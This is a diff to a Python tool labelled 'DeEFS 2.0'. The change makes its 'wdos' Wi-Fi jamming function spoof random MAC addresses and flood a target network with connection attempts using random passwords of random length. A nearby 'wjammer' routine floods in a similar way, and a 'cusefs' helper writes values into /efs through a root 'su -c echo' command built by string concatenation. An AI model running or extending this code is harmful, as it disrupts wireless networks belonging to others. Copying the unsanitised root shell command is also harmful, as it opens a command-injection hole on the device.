@@ -1,5 +1,6 @@
 #DeEFS 2.0
 from random import choice as rch
+from random import randint as rl
 from os import system as sy
 from time import sleep as sl
 import subprocess,re
@@ -53,9 +54,10 @@ def wjammer(reg,s,tar,typed="open",pasw=""):
     else: macx=tar
     sl(s);dwlan(str(macx),rf=True);wcon(macx,pasw,typed);print("\u001b[32m["+str(i+1)+","+macx+"] wlan jammer packet send")
   dwlan(str(back))
-def wdos(reg,s,tar,typed="wpa2"):
+def wdos(reg,s,tar,ran,typed="wpa2"):
   back=bmac(0)
-  for i in range(reg):ja=dwlan("rand");wcon(tar,unicg(63),typed);print("\u001b[32m["+str(i+1)+","+tar+"] wlan jammer packet send > "+ja);sl(s)
+  if ran < 8 or ran > 63:exit(0)
+  for i in range(reg):ja=dwlan("rand");wcon(tar,unicg(rl(8,ran)),typed);print("\u001b[32m["+str(i+1)+","+tar+"] wlan jammer packet send > "+ja);sl(s)
   dwlan(str(back))
 def cusefs(dict,value):sy("su -c echo "+value+" > /efs/"+dict)
 #jump_out
